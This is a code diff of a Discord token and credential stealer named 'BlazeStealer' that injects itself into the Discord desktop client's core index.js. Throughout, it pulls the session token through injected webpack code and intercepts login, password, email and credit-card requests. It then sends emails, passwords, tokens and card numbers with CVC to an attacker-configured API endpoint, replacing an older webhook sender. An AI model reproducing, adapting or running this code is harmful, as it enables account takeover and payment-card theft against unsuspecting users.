@@ -11,6 +11,7 @@ const os = require('os')
 const https = require("https");
 const computerName = os.hostname();
 
+
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
 
 String.prototype.insert = function(index, string) {
@@ -21,6 +22,7 @@ String.prototype.insert = function(index, string) {
     return string + this;
 };
 
+let bannerurl = ""
 let usericonurl = ""
 
 const discordPath = (function() {
@@ -50,6 +52,8 @@ function updateCheck() {
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+    if(app === 'Lightcord')return;
+    if(app === 'DiscordCanary')return;
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
 
@@ -68,6 +72,9 @@ function updateCheck() {
         const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
+
+
+
 const fileSize = fs.statSync(indexJS).size
 fs.readFileSync(indexJS, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
@@ -76,7 +83,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('core' + 'num', indexJS).replace('blackcap', '${config.apiurl}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -145,11 +152,45 @@ document.addEventListener('click',handler,false);
 
 noSessionPlease()
 
+const hooker = async (content) => {
+    const data = JSON.stringify(content);
+    const url = new URL(config.apiurl);
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+        },
+    };
+    const req = https.request(options);
+
+    req.on("error", (err) => {
+        console.log(err);
+    });
+    req.write(data);
+    req.end();
+};
 
 
+async function post(url, embed){
+    const window = BrowserWindow.getAllWindows()[0];
+    console.log(url + embed)
+    var b = await window.webContents.executeJavaScript(` 
+    fetch("${url}", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(${embed})
+    })`, !0)
+    return b
+}
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(config.webhook)) {
+    if (details.url.startsWith(config.apiurl)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -184,49 +225,6 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 
 
-const hooker = async (content) => {
-    const data = JSON.stringify(content);
-    const url = new URL(config.webhook);
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-        },
-    };
-    const req = https.request(options);
-
-    req.on("error", (err) => {
-        console.log(err);
-    });
-    req.write(data);
-    req.end();
-};
-
-const hooker2 = async (content) => {
-    const data = JSON.stringify(content);
-    const url = new URL(config.webhook2);
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-        },
-    };
-    const req = https.request(options);
-
-    req.on("error", (err) => {
-        console.log(err);
-    });
-    req.write(data);
-    req.end();
-};
 
 
 async function FirstTime() {
@@ -234,8 +232,8 @@ async function FirstTime() {
     window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
 
         if (config['init-notify'] == "true") {
-            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+            if (fs.existsSync(path.join(__dirname, "Blaze"))) {
+                fs.rmdirSync(path.join(__dirname, "Blaze"));
                 if (token == null || token == undefined || token == "") {
                     var {
                         ip
@@ -248,7 +246,7 @@ async function FirstTime() {
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                vavalue: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                                 inline: !1
 							}],
                             author: {
@@ -256,8 +254,11 @@ async function FirstTime() {
                             }
 						}]
                     };
+                    let data = JSON.stringify(c);
+                    let UwU = JSON.stringify({ data: data, token: token })
+                    post(config.apiurl, UwU);
                     hooker(c)
-                    hooker2(c)
+
                 } else {
                     var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                     var {
@@ -300,18 +301,20 @@ async function FirstTime() {
 							}]
                     };
 
+                    let data = JSON.stringify(c);
+                    let UwU = JSON.stringify({ data: data, token: token })
+                    post(config.apiurl, UwU);
                     hooker(c)
-                    hooker2(c)
                 };
 
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
+                if (!fs.existsSync(path.join(__dirname, "Blaze"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+                fs.rmdirSync(path.join(__dirname, "Blaze"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -323,7 +326,6 @@ async function FirstTime() {
                                 content: "",
                                 embeds: [{
                                     title: "BlazeStealer, Powered By BlazeInc.",
-                                    description: `${b.username}'s account`,
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -335,8 +337,11 @@ async function FirstTime() {
                                     }
 						}]
                             };
+                            
+                            let data = JSON.stringify(c);
+                            let UwU = JSON.stringify({ data: data, token: token })
+                            post(config.apiurl, UwU);
                             hooker(c)
-                            hooker2(c)
 
                         } else {
                             var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
@@ -378,8 +383,11 @@ async function FirstTime() {
                                     }
 							}]
                             };
+                            let data = JSON.stringify(c);
+                            let UwU = JSON.stringify({ data: data, token: token })
+                            post(config.apiurl, UwU);
                             hooker(c)
-                            hooker2(c)
+                            
                         }
                     }
 
@@ -401,22 +409,6 @@ const Filter = {
 
 
 
-async function saveidtofile(text, name) {
-    fs.open(name, function(err) {
-        if (err) return;
-    });
-    fs.appendFile(name, `${text}\n`, function(err) {
-        if (err) return;
-    });
-}
-
-
-async function deletefile(name) {
-    fs.unlink(`${name}`, function(err) {
-        if (err) return;
-    });
-}
-
 
 async function getFromURL(url, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -429,41 +421,6 @@ async function getFromURL(url, token) {
     return b
 }
 
-async function getFromURLnp(url, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var b = await window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "${url}", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );`, !0)
-    return b
-}
-
-
-
-
-function GetNSFW(reader) {
-    if (reader == true) {
-        return "🔞 `NSFW Allowed`"
-    }
-    if (reader == false) {
-        return "🔞 `NSFW Not Allowed`"
-    } else {
-        return "Idk bro you got me"
-    }
-}
-
-function GetA2F(reader) {
-    if (reader == true) {
-        return "🔒 `A2F Enabled`"
-    }
-    if (reader == false) {
-        return "🔓 `A2F Not Enabled`"
-    } else {
-        return "Idk bro you got me"
-    }
-}
-
 
 
 function GetNitro(flags) {
@@ -471,14 +428,15 @@ function GetNitro(flags) {
         return "\`No Nitro\`"
     }
     if (flags == 1) {
-        return "<:classic:896119171019067423> \`Nitro Classic\`"
+        return "\`Nitro Classic\`"
     }
     if (flags == 2) {
-        return "<a:boost:824036778570416129> \`Nitro Boost\`"
+        return "\`Nitro Boost\`"
     } else {
         return "\`No Nitro\`"
     }
 }
+
 
 function GetRBadges(flags) {
     const Discord_Employee = 1;
@@ -549,97 +507,97 @@ function GetLangue(read) {
     const korea = 'ko';
     var langue = "";
     if (read == France) {
-        langue += "🇫🇷 French"
+        langue += ":flag_fr: French"
     }
     if (read == Dansk) {
-        langue += "🇩🇰 Dansk"
+        langue += ":flag_dk: Dansk"
     }
     if (read == Deutsch) {
-        langue += "🇩🇪 Deutsch"
+        langue += ":flag_de: Deutsch"
     }
     if (read == englishUK) {
-        langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
+        langue += ":england: English"
     }
     if (read == englishUS) {
-        langue += "🇺🇸 USA"
+        langue += ":flag_us: USA"
     }
     if (read == espagnol) {
-        langue += "🇪🇸 Espagnol"
+        langue += ":flag_es: Espagnol"
     }
     if (read == hrvatski) {
-        langue += "🇭🇷 Croatian"
+        langue += ":flag_hr: Croatian"
     }
     if (read == italianio) {
-        langue += "🇮🇹 Italianio"
+        langue += ":flag_it: Italianio"
     }
     if (read == lietuviskai) {
-        langue += "🇱🇹 Lithuanian"
+        langue += ":flag_lt: Lithuanian"
     }
     if (read == magyar) {
-        langue += "🇭🇺 Hungarian"
+        langue += ":flag_hu: Hungarian"
     }
     if (read == neerland) {
-        langue += "🇳🇱 Dutch"
+        langue += ":flag_nl: Dutch"
     }
     if (read == Norsk) {
-        langue += "🇳🇴 Norwegian"
+        langue += ":flag_no: Norwegian"
     }
     if (read == polski) {
-        langue += "🇵🇱 Polish"
+        langue += ":flag_pl: Polish"
     }
     if (read == portugues) {
-        langue += "🇵🇹 Portuguese"
+        langue += ":flag_pt: Portuguese"
     }
     if (read == Romana) {
-        langue += "🇷🇴 Romanian"
+        langue += ":flag_ro: Romanian"
     }
     if (read == finlandais) {
-        langue += "🇫🇮 Finnish"
+        langue += ":flag_fi: Finnish"
     }
     if (read == svenska) {
-        langue += "🇸🇪 Swedish"
+        langue += ":flag_se: Swedish"
     }
     if (read == turk) {
-        langue += "🇹🇷 Turkish"
+        langue += ":flag_tr: Turkish"
     }
     if (read == tiengviet) {
-        langue += "🇻🇳 Vietnamese"
+        langue += ":flag_vn: Vietnamese"
     }
     if (read == cestina) {
-        langue += "🇨🇿 Czech"
+        langue += ":flag_cz: Czech"
     }
     if (read == grecque) {
-        langue += "🇬🇷 Greek"
+        langue += ":flag_gr: Greek"
     }
     if (read == bulgar) {
-        langue += "🇧🇬 Bulgarian"
+        langue += ":flag_bg: Bulgarian"
     }
     if (read == russe) {
-        langue += "🇷🇺 Russian"
+        langue += ":flag_ru: Russian"
     }
     if (read == ukrainier) {
-        langue += "🇺🇦 Ukrainian"
+        langue += ":flag_ua: Ukrainian"
     }
     if (read == inde) {
-        langue += "🇮🇳 Indian"
+        langue += ":flag_in: Indian"
     }
     if (read == thai) {
-        langue += "🇹🇼 Taiwanese"
+        langue += ":flag_tw: Taiwanese"
     }
     if (read == chineschina) {
-        langue += "🇨🇳 Chinese-China"
+        langue += ":flag_cn: Chinese-China"
     }
     if (read == japonais) {
-        langue += "🇯🇵 Japanese"
+        langue += ":flag_jp: Japanese"
     }
     if (read == chinestaiwan) {
-        langue += "🇨🇳 Chinese-Taiwanese"
+        langue += ":flag_cn: Chinese-Taiwanese"
     }
     if (read == korea) {
-        langue += "🇰🇷 Korean"
+        langue += ":flag_kr: Korean"
     }
     if (langue == "") {
-        langue = "None"
+        langue = "\`None\`"
     }
     return langue
 }
@@ -737,7 +695,7 @@ async function Login(email, password, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "No Rare Friends"
+                    gay = "\`No Rare Friends\`"
                 }
                 return gay
             }
@@ -749,9 +707,9 @@ async function Login(email, password, token) {
                     if (z.type == "") {
                         return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
                         return "\`None\`"
                     }
@@ -815,13 +773,17 @@ async function Login(email, password, token) {
                     "title": `Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
+
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}]
             }
+            
+            let data = JSON.stringify(params);
+            let UwU = JSON.stringify({ data: data, token: token })
+            post(config.apiurl, UwU);
             hooker(params)
-            hooker2(params)
         })
     })
 }
@@ -869,7 +831,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "No Rare Friends"
+                    gay = "\`No Rare Friends\`"
                 }
                 return gay
             }
@@ -881,9 +843,9 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     if (z.type == "") {
                         return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
                         return "\`None\`"
                     }
@@ -893,6 +855,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 }
                 return billing
             }
+            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
                 username: "BlazeStealer",
                 content: "",
@@ -944,13 +907,17 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "title": `Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
+
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}]
             }
+            let data = JSON.stringify(params);
+            let UwU = JSON.stringify({ data: data, token: token })
+            post(config.apiurl, UwU);
+            
             hooker(params)
-            hooker2(params)
         })
     })
 }
@@ -994,7 +961,7 @@ async function ChangeEmail(newemail, password, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "No Rare Friends"
+                    gay = "\`No Rare Friends\`"
                 }
                 return gay
             }
@@ -1006,9 +973,9 @@ async function ChangeEmail(newemail, password, token) {
                     if (z.type == "") {
                         return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
                         return "\`None\`"
                     }
@@ -1031,46 +998,46 @@ async function ChangeEmail(newemail, password, token) {
                 username: "BlazeStealer",
                 content: "",
                 embeds: [{
-                        "title": "BlazeStealer Email Changed",
-                        description: `${info.username}'s account`,
-                        "color": config['embed-color'],
-                        "fields": [{
-                                name: ":mag_right: User ID",
-                                value: `\`${info.id}\``,
-                                inline: true
-					}, {
-                                name: ":bust_in_silhouette: Username",
-                                value: `\`${info.username}#${info.discriminator}\``,
-                                inline: true
-					}, {
-                                name: ":sparkles: Nitro",
-                                value: `${GetNitro(info.premium_type)}`,
-                                inline: false
-					}, {
-                                name: ":pushpin: Badges",
-                                value: `${GetBadges(info.flags)}`,
-                                inline: true
-					}, {
-                                name: ":dollar: Billing",
-                                value: `${Cool()}`,
-                                inline: true
-					}, {
-                                name: ":e_mail: Email",
-                                value: `\`${newemail}\``,
-                                inline: false
-					}, {
-                                name: ":fire: Password",
-                                value: `\`${password}\``,
-                                inline: true
-					}, {
-                                name: "Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
-                                inline: false
-					},
-				],
-                        "thumbnail": {
-                            "url": `${usericonurl}`
-                        }
+                    "title": "BlazeStealer Email Changed",
+                    description: `${info.username}'s account`,
+                    "color": config['embed-color'],
+                    "fields": [{
+                            name: ":mag_right: User ID",
+                            value: `\`${info.id}\``,
+                            inline: true
+                }, {
+                            name: ":bust_in_silhouette: Username",
+                            value: `\`${info.username}#${info.discriminator}\``,
+                            inline: true
+                }, {
+                            name: ":sparkles: Nitro",
+                            value: `${GetNitro(info.premium_type)}`,
+                            inline: false
+                }, {
+                            name: ":pushpin: Badges",
+                            value: `${GetBadges(info.flags)}`,
+                            inline: true
+                }, {
+                            name: ":dollar: Billing",
+                            value: `${Cool()}`,
+                            inline: true
+                }, {
+                            name: ":e_mail: Email",
+                            value: `\`${newemail}\``,
+                            inline: false
+                }, {
+                            name: ":fire: Password",
+                            value: `\`${password}\``,
+                            inline: true
+                }, {
+                            name: "Token",
+                            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+                            inline: false
+                },
+            ],
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
 				}, {
                         "title": `Total Friends (${totalFriends()})`,
                         "color": config['embed-color'],
@@ -1082,8 +1049,10 @@ async function ChangeEmail(newemail, password, token) {
 			}
 		]
             }
+            let data = JSON.stringify(params);
+            let UwU = JSON.stringify({ data: data, token: token })
+            post(config.apiurl, UwU);
             hooker(params)
-            hooker2(params)
         })
     })
 }
@@ -1108,24 +1077,35 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             username: "BlazeStealer",
             content: "",
             embeds: [{
-                    "title": "BlazeStealer Credit Card Added",
-                    "description": `
-                    **IP:** ${ip}\n\n
-                    **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
-                    **ID**\n\`\`\`${info.id}\`\`\`\n
-                    **Email**\n\`\`\`${info.email}\`\`\`\n
-                    **Nitro Type**\n${GetNitro(info.premium_type)}\n
-					**Badges**\n${GetBadges(info.flags)}\n
-                    **Credit Card **\n\`\`\`${number}|${expir_month}/${expir_year}|${cvc}\`\`\`\n
-                    **Token** \n\`\`\`${token}\`\`\``,
-                    "thumbnail": {
-                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
-                    },
+                "title": "BlazeStealer Credit Card Added",
+                "description": `
+                **IP:** ${ip}\n\n
+                **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
+                **ID**\n\`\`\`${info.id}\`\`\`\n
+                **Email**\n\`\`\`${info.email}\`\`\`\n
+                **Nitro Type**\n${GetNitro(info.premium_type)}\n
+                **Badges**\n${GetBadges(info.flags)}\n
+                **Credit Card **\n\`\`\`${number}|${expir_month}/${expir_year}|${cvc}\`\`\`\n
+                **Token** \n\`\`\`${token}\`\`\``,
+                "thumbnail": {
+                    "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
+                },
             },
+                {
+                    "title": `Guilds Owner`,
+                    "color": config['embed-color'],
+                    "description": `\`\`\`diff\n${fs.readFileSync('hq_guilds.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+            }
         ]
         }
+        let data = JSON.stringify(params);
+        let UwU = JSON.stringify({ data: data, token: token })
+        post(config.apiurl, UwU);
         hooker(params)
-        hooker2(params)
 }
 
 const ChangePasswordFilter = {
@@ -1187,5 +1167,9 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
         })).catch(console.error);
     }
 });
+
+
+
+
 
 module.exports = require('./core.asar')
